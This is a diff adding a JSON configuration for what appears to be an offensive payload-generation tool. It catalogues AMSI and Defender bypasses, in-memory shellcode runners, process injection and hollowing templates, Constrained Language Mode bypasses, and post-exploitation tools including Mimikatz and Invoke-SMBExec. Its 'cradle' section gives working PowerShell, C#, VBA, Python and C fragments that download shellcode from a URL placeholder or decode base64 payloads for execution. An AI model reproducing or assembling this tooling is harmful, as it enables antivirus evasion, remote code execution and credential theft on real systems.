@@ -1,0 +1,236 @@
+{
+    "bypass": {
+        "ps-amsi": {
+            "lang": "powershell",
+            "description": "AMSI Bypass",
+            "filename": "amsibypass4.ps1"
+        },
+	"defender-1": {
+	    "lang": "powershell",
+	    "description": "Clear DefenderLoaded Rules",
+	    "filename": "cleanDefenderRule.ps1"
+	}
+    },
+    "template": {
+        "py-1": {
+            "lang": "python",
+            "description": "[PYTHON] In-memory Shellcode Runner",
+            "filename": "buffshark_template.py"
+        },
+        "ps-1": {
+            "lang": "powershell",
+            "description": "[PS] Reflective In-memory Shellcode Runner",
+            "filename": "shellcode_runner_mem_template.ps1"
+        },
+        "ps-2": {
+            "lang": "powershell",
+            "description": "[PS] Reflective In-memory Unmanaged PE Runner",
+            "filename": "peinject_template.ps1"
+        },
+        "aspx-1": {
+            "lang": "csharp",
+            "description": "[ASPX] Process Injection (NtSession) Shellcode Runner",
+            "filename": "shellcode_injector_ntsession_template.aspx"
+        },
+        "load-exe-1": {
+            "lang": "powershell",
+            "description": "Import C# Assembly into PS",
+            "filename": "load_exe1_template.ps1"
+        },
+        "cs-1": {
+            "lang": "csharp",
+            "description": "[C#] Process Injection (NtSession) Shellcode Runner",
+            "filename": "shellcode_injector_ntsession_template.cs",
+            "exe": true
+        },
+        "cs-2": {
+            "lang": "csharp",
+            "description": "[C#] Process Hollowing Shellcode Runner (SeImpersonatePrivilege required) with SpoolSample",
+            "filename": "printspoofer_template.cs",
+            "exe": true
+        },
+        "cs-3": {
+            "lang": "csharp",
+            "description": "[C#] Process Hollowing Shellcode Runner",
+            "filename": "process_hollow_shellcodeAuto_template.cs",
+            "exe": true
+        },
+        "custom-ps": {
+            "lang": "powershell",
+            "description": "Custom Powershell Script",
+            "filename": "custom_template.ps1"
+        },
+        "vb-1": {
+            "lang": "vba",
+            "description": "[VBA Macro] In-memory Shellcode Runner",
+            "filename": "shellcode_runner_template.vb"
+        },
+        "installutil-1": {
+            "lang": "csharp",
+            "description": "[C#] [Generic] Bypass PS CLM (c:\\windows\\microsoft.net\\framework64\\v4.0.30319\\installutil.exe /logfile= /logtoconsole=false /U c:\\path\\to\\this.exe)",
+            "filename": "../csharp/bypass_clm_installutil.cs",
+            "exe": true,
+            "references": [
+                "../dlls/v4.0/System.Management.Automation.dll"
+            ]
+        },
+        "installutil-2": {
+            "lang": "csharp",
+            "description": "[C#] [Generic] Bypass PS CLM (c:\\windows\\microsoft.net\\framework64\\v4.0.30319\\installutil.exe /logfile= /logtoconsole=false /U c:\\path\\to\\this.exe) hard-coded ps path",
+            "filename": "bypass_clm_installutil_psfile.cs",
+            "exe": true,
+            "references": [
+                "../dlls/v4.0/System.Management.Automation.dll"
+            ]
+        },
+        "installutil-3": {
+            "lang": "powershell",
+            "description": "[C#] [Auto] Bypass PS CLM with InstallUtil",
+            "filename": "bypass_clm_installutil.ps1"
+        },
+        "service-1": {
+            "lang": "powershell",
+            "description": "[C#] [Auto] Bypass PS CLM with ServiceBinary",
+            "filename": "bypass_clm_service.ps1"
+        },
+        "service-2": {
+            "lang": "powershell",
+            "description": "[C#] [Generic] Bypass PS CLM with ServiceBinary(Invoke-ServicePwn -Name xxx -Command whoami)",
+            "filename": "bypass_clm_servicepwn.ps1"
+        },
+        "c-1": {
+            "lang": "c",
+            "description": "[GCC] Shellcode Runner",
+            "filename": "shellcode_runner.c",
+	    "elf": true,
+	    "platform": "linux"
+        },
+        "c-2": {
+            "lang": "c",
+            "description": "[GCC] Custom Syscall Runner",
+            "filename": "syscall_template.c",
+	    "elf": true,
+	    "platform": "linux"
+        }
+    },
+    "common-pstool": [
+        {
+            "name": "LAPSToolkit.ps1",
+            "filepath": "../LAPSToolkit-master/LAPSToolkit.ps1"
+        },
+        {
+            "name": "Inveigh",
+            "filepath": "../Inveigh.ps1"
+        },
+        {
+            "name": "PowerUp.ps1",
+            "filepath": "../PowerSploit-master/Privesc/PowerUp.ps1"
+        },
+        {
+            "name": "SharpHound.ps1",
+            "filepath": "../SharpHound.ps1"
+        },
+        {
+            "name": "MimiKatz.ps1",
+            "filepath": "../Invoke-Mimidogz.ps1"
+        },
+        {
+            "name": "BypassUAC with FodHelper",
+            "filepath": "../ps/bypass_uac_fodhelper.ps1"
+        },
+        {
+            "name": "PowerView.ps1",
+            "filepath": "../PowerSploit-master/Recon/PowerView.ps1"
+        },
+        {
+            "name": "PowerUpSQL.ps1",
+            "filepath": "../PowerUpSQL-master/PowerUpSQL.ps1",
+	    "dependency": [
+		"Inveigh"
+	    ]
+        },
+        {
+            "name": "SpoolFool.ps1",
+            "filepath": "SpoolFool.ps1"
+        },
+        {
+            "name": "minidump.ps1",
+            "filepath": "../ps/minidump.ps1"
+        },
+        {
+            "name": "Enum-ADTrusts.ps1",
+            "filepath": "Enum-ADTrusts.ps1"
+        },
+        {
+            "name": "PowerMAD.ps1",
+            "filepath": "../ps/powermad.ps1"
+        },
+        {
+            "name": "Invoke-SMBExec.ps1",
+            "filepath": "../Invoke-TheHash/Invoke-SMBExec.ps1"
+        },
+        {
+            "name": "Invoke-PsExec.ps1 (Invoke-PsExec -Computername appsrv01 -command whoami -resultfile $env:tmp\\out.txt)",
+            "filepath": "../Invoke-PsExec.ps1"
+        },
+        {
+            "name": "Invoke-ReflectivePEInjection.ps1",
+            "filepath": "Invoke-ReflectivePEInjection.ps1"
+        },
+        {
+            "name": "ADRecon.ps1",
+            "filepath": "../ADRecon-master/ADRecon.ps1"
+        },
+	{
+	    "name": "Invoke-GodWrite.ps1 (Invoke-GodWrite -Victim appsrv01 -Domain prod.corp1.com -DomainController cdc01)",
+	    "filepath": "Abuse_GenericWrite_Computer.ps1",
+	    "dependency": [
+                "PowerView.ps1",
+                "PowerMAD.ps1",
+		"Rubeus"
+	    ]
+	}
+    ],
+    "cradle": {
+        "powershell": {
+            "def": "[Byte[]] $buf = ",
+            "staged": "(new-object net.webclient).downloaddata(\"%(url)s\");",
+            "stageless": "[System.Convert]::FromBase64String(\"%(payload)s\");"
+        },
+        "python": {
+            "def": "buf = ",
+            "staged": "downloader('%(url)s')",
+            "stageless": "base64.b64decode('%(payload)s')"
+        },
+        "csharp": {
+            "def": "byte[] buf = ",
+            "staged": "new System.Net.WebClient().DownloadData(\"%(url)s\");",
+            "stageless": "System.Convert.FromBase64String(\"%(payload)s\");"
+        },
+        "vba": {
+            "def": "buf = ",
+            "staged": "xmlhttp.responseBody",
+            "stageless": "b64(buf, 1, False)",
+            "preCode": {
+                "staged": "Dim xmlhttp As New MSXML2.XMLHTTP60\nxmlhttp.Open \"GET\", \"%(url)s\", False\nxmlhttp.send\n",
+                "stageless": "%(payload)s\n"
+            }
+        },
+        "c": {
+            "def": "unsigned char *buf = ",
+            "stageless": "\"%(payload)s\"; tmpSize = strlen(buf); buf = base64_decode(buf, tmpSize, &tmpSize);"
+        }
+    },
+    "libtransform": {
+        "powershell": "lib/transform.ps1",
+        "python": "lib/transform.py",
+        "csharp": "lib/transform.csharp",
+        "vba": "lib/transform.vbapplication",
+        "c": "lib/transform.c"
+    },
+    "checkBits": {
+        "python": {
+            "code": "import sys\nis64 = sys.maxsize > 2**32\nassert (is64 and 64 == %d) or ((not is64) and 32 == %d), 'mismatch'"
+        }
+    }
+}
